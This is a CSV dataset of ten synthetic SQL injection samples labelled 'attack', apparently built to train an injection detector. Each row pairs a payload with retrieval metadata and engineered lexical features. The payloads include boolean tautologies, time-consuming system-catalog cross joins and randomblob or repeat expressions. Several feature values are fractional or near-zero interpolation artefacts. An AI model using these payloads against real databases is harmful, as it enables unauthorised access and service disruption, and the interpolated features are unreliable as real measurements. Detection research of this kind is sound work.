id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1""  )   as rqpp where 9383  =  9383 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000165,0.27791288194949293,157.0,34.70318755459481,4.1626631521943755,79.92231288216368,16.0,44.78087467243113,16.296812445405187,0.5090593177207877,0.10191082802547771,0.28522850109828746,0.10380135315544707,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.296812445405189,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000002,attack,boolean,"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000622,0.19444870131138461,150.55565463486968,34.31113092697394,4.313082623025797,77.0,17.0,40.244523707895745,16.311130926973934,0.5115582059232562,0.11294142208695265,0.26718223227214105,0.1083181397176502,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.311130926973936,0.0,0.0,3.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000772,0.23416487711436426,117.71160869768713,29.12225776412051,3.7746191412545396,41.97806211296407,14.0,43.73354658472305,18.0,0.3563182525529615,0.1191006285299987,0.37145173937847004,0.15312937953856975,0.0,3.0,0.0,0.0,0.0,1.0,0.0,9.122257764120508,0.8777422358794913,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R001168,0.19865457732838473,117.57197859569695,30.0,3.8433639803430406,50.0,10.0,42.25758287655756,15.31439571913939,0.42543467299908466,0.08508693459981694,0.3592496787729483,0.1302287136281501,5.0,0.0,0.0,1.0,0.0,0.0,0.0,8.31439571913939,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,boolean,"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",nearest_attack_euclidean,R000642,0.09685917347640395,96.69706931739498,26.69706931739498,3.24840288816627,11.75765545391598,24.0,48.0,12.939413863478997,0.12148450775673586,0.24823737521095032,0.4964747504219006,0.13380336661041325,0.0,0.0,1.0,0.0,0.0,2.0,0.0,8.0,0.0,0.9394138634789961,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R000288,0.38521713488569326,163.76730803742922,29.32326919625708,3.745366468047545,68.0,16.0,62.413846429943376,17.353461607485844,0.4155697415406695,0.09778111565662811,0.38076346662220695,0.10588567618049544,0.0,0.0,0.0,0.0,1.0,2.0,0.0,9.353461607485842,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000491,0.22698642517971576,69.630468745419,26.0,3.798909444060633,15.420312496946003,21.0,24.420312496946003,8.789843751526998,0.2213253887093376,0.3016828011969004,0.3506180177937235,0.1263737923000386,0.0,0.0,2.0,0.0,0.0,2.0,0.0,3.0000000000000004,0.0,0.7898437515269973,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000995,0.6567585998036124,137.2742269783453,30.0,4.028625903503801,74.2742269783453,8.0,37.0,18.0,0.5410597852340926,0.058278122509956495,0.2695363166085488,0.13112577564740213,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.2742269783452966,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000009,attack,boolean,-3535%'   )    )     )   or 5605  =  4660 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000929,3.110726551922309,67.50365569320377,12.953290123883384,2.1455255195066916,4.550365569320377,6.604386831844512,42.697806584077746,13.651096707961127,0.06722850414987636,0.09172759488672935,0.639358388513765,0.20168551244962923,3.550365569320376,0.0,0.550365569320376,0.0,0.0,1.5503655693203762,0.0,6.899268861359248,1.1007311386407521,0.0,0.0,2.100731138640752,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5503655693203761,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.550365569320376
SMOTE_000010,attack,boolean,-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,nearest_attack_euclidean,R000404,0.4268516175356646,74.85593207957528,21.314406792042472,3.1034219191009984,13.0,12.0,37.48474566366023,12.371186415915057,0.17437271549123703,0.16095942968421884,0.49954239792279154,0.1651254569017526,4.0,0.0,1.0,0.0,0.0,2.0,0.0,5.371186415915057,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
